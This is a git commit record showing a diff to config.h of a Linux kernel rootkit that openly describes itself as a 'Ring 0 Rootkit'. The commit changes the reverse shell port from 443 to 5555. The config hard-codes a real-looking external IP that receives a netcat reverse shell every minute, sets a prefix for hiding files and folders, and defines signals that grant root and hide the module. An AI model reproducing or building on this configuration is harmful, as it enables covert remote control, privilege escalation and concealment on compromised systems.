4ba0239f6e6665114ef685c3a728afdc35acdc1b
cyberbullet <yellphonenaing@gmail.com>
2025-07-02 23:56:06 +0630

    Change reverse shell port to 5555
    - Updated YOUR_SRV_PORT from 443 to 5555
    - Rebuilt module with new port configuration

--- config.h
+++ config.h
@@ -33,7 +33,7 @@ MODULE_DESCRIPTION("Ring 0 Rootkit for Linux Kernels x86/x86_64 5.x/6.x");
 #define MAGIC_PREFIX "reb_"         // folder/file prefix to hide
 //==========[REVERSE SHELL]=========//
 #define YOUR_SRV_IP "150.241.91.206"     // IP address of your server to receive the shell via netcat (executes every 1 minute)
-#define YOUR_SRV_PORT 443          // port where you will receive the shell
+#define YOUR_SRV_PORT 5555          // port where you will receive the shell
 //==================================//
 #define SIGUSR1 10                  // user2root signal
 #define SIGUSR2 12                  // hide/show module signal
